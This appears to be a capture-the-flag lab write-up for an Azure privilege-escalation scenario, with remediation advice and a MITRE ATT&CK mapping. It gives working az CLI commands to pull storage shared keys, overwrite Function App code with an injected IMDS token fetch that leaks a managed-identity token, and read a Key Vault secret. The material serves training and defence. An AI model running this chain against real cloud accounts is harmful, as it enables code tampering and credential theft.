# Shared Key Authorization

**Difficulty:** Advanced | **Provider:** Azure | **Category:** Storage / Function App / Key Vault

## Scenario

An administrator assigned the **Storage Account Contributor** role to a user, believing it
only controlled management-plane access. In reality, this role also exposes the storage
account's **shared key** via the management API. Additionally, the administrator forgot to
disable shared key authorization on the account.

The storage account hosts source code for Azure Function Apps that have a system-assigned
managed identity with access to a Key Vault containing the flag.

By obtaining the shared key, the attacker can overwrite the function code with a payload
that leaks the managed identity token — which is then used to read the flag from Key Vault.

## Attack Path

```
[Attacker] Storage Account Contributor
    |
    v
az storage account keys list  -->  shared key
    |
    v
az storage blob download  -->  function app source (fapp.js)
    |
    v
Inject IMDS token fetch into fapp.js
    |
    v
az storage blob upload  -->  overwrite function code
    |
    v
Trigger function via HTTP  -->  receive managed identity token
    |
    v
az keyvault secret show --name flag  -->  flag
```

### Step 1 — Get the storage account key

```bash
az storage account keys list \
  --account-name <storage_account> \
  --resource-group <rg> \
  --query "[0].value" -o tsv
```

### Step 2 — Find and download the function code

```bash
az storage blob list \
  --account-name <storage_account> --account-key <key> \
  --container-name <container> -o table

az storage blob download \
  --account-name <storage_account> --account-key <key> \
  --container-name <container> --name fapp.js --file ./fapp.js
```

### Step 3 — Inject an IMDS token fetch and re-upload

Add to `fapp.js`:

```javascript
const res = await fetch(
  "http://169.254.169.254/msi/token?api-version=2019-08-01&resource=https://vault.azure.net",
  { headers: { Metadata: "true" } }
);
const { access_token } = await res.json();
context.res = { body: access_token };
```

```bash
az storage blob upload \
  --account-name <storage_account> --account-key <key> \
  --container-name <container> --name fapp.js --file ./fapp.js --overwrite
```

### Step 4 — Trigger the function and read the flag

```bash
# Trigger the function HTTP endpoint, capture the token in the response
# Then:
az keyvault secret show --vault-name <kv-name> --name flag \
  --query value -o tsv
# (pass the MI token as Authorization: Bearer <token>)
```

## How to Fix in Production

1. **Disable shared key authorization**: `az storage account update --allow-shared-key-access false`
2. **Prefer RBAC over shared keys** — assign `Storage Blob Data Contributor` directly
   to identities rather than granting full account key access via Contributor.
3. **Use managed identities** for function app storage access so no keys are ever needed.
4. **Store function code in source control** and deploy via CI/CD rather than writing
   directly to a blob — this prevents runtime code tampering.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Cloud Instance Metadata API | T1552.005 |
| Steal Application Access Token | T1528 |
| Account Manipulation | T1098 |
